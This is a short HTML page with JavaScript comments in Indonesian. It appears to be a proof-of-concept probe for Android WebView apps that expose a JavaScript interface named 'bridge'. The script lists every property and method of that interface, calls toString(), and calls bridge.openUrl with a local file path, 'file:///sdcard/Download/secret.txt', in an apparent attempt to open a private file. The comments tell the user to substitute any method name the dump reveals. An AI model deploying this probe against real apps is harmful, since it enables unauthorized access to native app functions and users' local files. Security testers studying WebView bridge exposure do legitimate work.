  <div id="output"></div>

  <script>
    function log(msg) {
      document.getElementById("output").innerHTML += msg + "<br>";
    }

    try {
      // cek apakah object "bridge" ada
      if (typeof bridge !== "undefined") {
        log("[+] Found JS Interface: bridge");

        // dump semua property / method yang bisa diakses
        for (var i in bridge) {
          log(" -> " + i);
        }

        // coba manggil method umum (kalau ada)
        try {
          log("[+] Testing bridge.toString(): " + bridge.toString());
        } catch (e) {
          log("[-] Error calling toString(): " + e);
        }

        // contoh eksekusi method arbitrary kalau ada
        // ganti 'openUrl' dengan nama method valid dari hasil dump
        try {
          if (typeof bridge.openUrl === "function") {
            bridge.openUrl("file:///sdcard/Download/secret.txt");
            log("[+] Called bridge.openUrl()");
          }
        } catch (e) {
          log("[-] Error calling openUrl(): " + e);
        }

      } else {
        log("[-] No 'bridge' object found.");
      }
    } catch (err) {
      log("[-] Exception: " + err);
    }
  </script>
